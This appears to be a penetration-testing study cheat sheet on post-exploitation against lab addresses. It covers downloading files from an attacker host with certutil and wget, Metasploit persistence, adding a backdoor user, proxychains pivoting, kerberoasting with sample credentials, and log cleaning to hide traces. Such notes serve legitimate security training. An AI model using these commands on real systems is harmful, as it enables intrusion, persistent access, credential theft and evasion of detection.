# Post Exploitation

### File Transfer Review

**Certutil**

`certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt`

**HTTP**

```
python3 -m http.server 80
python2 -m SimpleHTTPServer 80
```

**Browser**

Navigate directly to file

**FTP**

`python -m pyftpdlib 21` start ftp server on attacking machine
`ftp 10.10.10.10` 

**Linux/PowerShell**

`wget`

### Maintaining Access Overview

Metasploit modules/scripts

**Persistence Scripts**

run persisitence -h
exploit/windows/local/persistence
exploit/windows/local/registry_persistence

**Scheduled Tasks**

run scheduleme
run schtaskabuse

**Add a user**

net user hacker password123 /add

### Pivoting Overview

2 networks:
- 10.10.155.5/24
- 10.10.10.5/24

**proxychains**

config file: /etc/proxychains4.conf

socks4	127.0.0.1 9050

port binding to 9050

`ssh -f -N -D 9050 root@10.10.155.5`

-f backgrounds ssh connection
-N no command execution, for port forwarding
-D where to bind the port

Traffic can be proxied through the connection

Run commands like nmap with proxychains

`proxychains nmap -p80 10.10.10.225`

look for .. Ok on port scanning

Try different scan types, like -sT, if -sS doesn't work

Run attacks through proxychains, like kerberoasting:

`proxychains impacket-GetUserSPNs ECORP.local/amoss:Password1 -dc-ip 10.10.10.225 -request`

RDP through proxychains:

`proxychains xfreerdp /u:administrator /p:Password123 /v:10.10.10.225`

Browser through proxychains, firefox must be closed:

`proxychains firefox`

**sshuttle**

`sshuttle -r root@10.10.155.5 10.10.10.0/24 --ssh-cmd "ssh -i pivot"`

No need to prefix commands like with proxychains

**chisel**

Go based TCP/UDP tunnel

### Cleaning Up

**Ethical hacking**

Make the system/network as it was when you entered it:

- Remove executables, scripts, and added files
- Remove malware, rootkits, and added user accounts
- Set settings back to original configurations

**Red Teaming**

All the above plus log cleaning, removing events, etc. Make it look like you were never there.
